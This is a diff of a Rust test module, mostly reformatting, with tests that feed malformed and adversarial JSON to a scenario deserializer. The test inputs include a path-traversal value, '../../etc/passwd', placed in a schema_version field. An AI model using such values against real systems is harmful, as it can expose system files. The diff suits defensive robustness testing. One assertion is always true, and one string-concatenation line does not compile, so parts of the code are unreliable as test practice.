-                r#"{"name":"test","extra_field":"injected"}"#,  // Unknown field
-                r#"{"name":"test","seed":"not_a_number"}"#,  // Wrong type
-                r#"{"name":"test","seed":null}"#,  // Null value
-                r#"{"name":null}"#,  // Null name
-                r#"{"nodes":"not_an_array"}"#,  // Wrong collection type
-                r#"{"name":"test","nodes":[{"id":"node1","role":"INVALID_ROLE"}]}"#,  // Invalid enum
-                r#"{}"#,  // Empty object
-                r#"{"name":"test","seed":9999999999999999999999999999999999999999999999999}"#,  // Number overflow
+                r#"{"name":"test","extra_field":"injected"}"#, // Unknown field
+                r#"{"name":"test","seed":"not_a_number"}"#,    // Wrong type
+                r#"{"name":"test","seed":null}"#,              // Null value
+                r#"{"name":null}"#,                            // Null name
+                r#"{"nodes":"not_an_array"}"#,                 // Wrong collection type
+                r#"{"name":"test","nodes":[{"id":"node1","role":"INVALID_ROLE"}]}"#, // Invalid enum
+                r#"{}"#,                                       // Empty object
+                r#"{"name":"test","seed":9999999999999999999999999999999999999999999999999}"#, // Number overflow
                 r#"{"name":"test","description":"very_long_description_" + "x".repeat(1_000_000)}"#, // Huge string
             ];
 
@@ -6521,7 +7669,9 @@ mod tests {
                 match deserialize_result {
                     Ok(parsed_scenario) => {
                         // If parsing succeeded, verify basic structure integrity
-                        assert!(!parsed_scenario.name().is_empty() || malicious_json.contains("null"));
+                        assert!(
+                            !parsed_scenario.name().is_empty() || malicious_json.contains("null")
+                        );
                     }
                     Err(_) => {
                         // Deserialization failure is expected for malformed JSON
@@ -6548,14 +7698,26 @@ mod tests {
 
             // Should handle deep nesting without stack overflow
             let deep_result: Result<serde_json::Value, _> = serde_json::from_str(deep_nested_json);
-            assert!(deep_result.is_ok() || deep_result.is_err(), "Should handle deep JSON without crashing");
+            assert!(
+                deep_result.is_ok() || deep_result.is_err(),
+                "Should handle deep JSON without crashing"
+            );
 
             // Attack 4: Large JSON payload stress testing
-            let large_scenario_data = (0..10000).map(|i| {
-                format!(r#"{{"id":"node_{}","name":"Node {}","role":"Verifier"}}"#, i, i)
-            }).collect::<Vec<_>>().join(",");
+            let large_scenario_data = (0..10000)
+                .map(|i| {
+                    format!(
+                        r#"{{"id":"node_{}","name":"Node {}","role":"Verifier"}}"#,
+                        i, i
+                    )
+                })
+                .collect::<Vec<_>>()
+                .join(",");
 
-            let large_json = format!(r#"{{"name":"large_test","seed":42,"nodes":[{}]}}"#, large_scenario_data);
+            let large_json = format!(
+                r#"{{"name":"large_test","seed":42,"nodes":[{}]}}"#,
+                large_scenario_data
+            );
 
             // Should handle large payloads without memory exhaustion
             let large_result: Result<serde_json::Value, _> = serde_json::from_str(&large_json);
@@ -6579,7 +7741,10 @@ mod tests {
             match unicode_result {
                 Ok(value) => {
                     if let Some(name) = value.get("name").and_then(|v| v.as_str()) {
-                        assert!(name.contains("🦀") || name.contains("unicode"), "Unicode should be preserved");
+                        assert!(
+                            name.contains("🦀") || name.contains("unicode"),
+                            "Unicode should be preserved"
+                        );
                     }
                 }
                 Err(_) => {
@@ -6593,17 +7758,20 @@ mod tests {
                 r#"{"schema_version":"../../etc/passwd","name":"test","seed":42}"#,
                 r#"{"schema_version":"","name":"test","seed":42}"#,
                 r#"{"schema_version":null,"name":"test","seed":42}"#,
-                r#"{"schema_version":123,"name":"test","seed":42}"#,  // Wrong type
+                r#"{"schema_version":123,"name":"test","seed":42}"#, // Wrong type
             ];
 
             for schema_attack in schema_version_attacks {
-                let schema_result: Result<serde_json::Value, _> = serde_json::from_str(schema_attack);
+                let schema_result: Result<serde_json::Value, _> =
+                    serde_json::from_str(schema_attack);
 
                 if let Ok(value) = schema_result {
                     // Malicious schema versions should be preserved but not executed
                     if let Some(schema) = value.get("schema_version") {
-                        assert!(schema.is_string() || schema.is_null() || schema.is_number(),
-                               "Schema version should maintain type safety");
+                        assert!(
+                            schema.is_string() || schema.is_null() || schema.is_number(),
+                            "Schema version should maintain type safety"
+                        );
                     }
                 }
             }
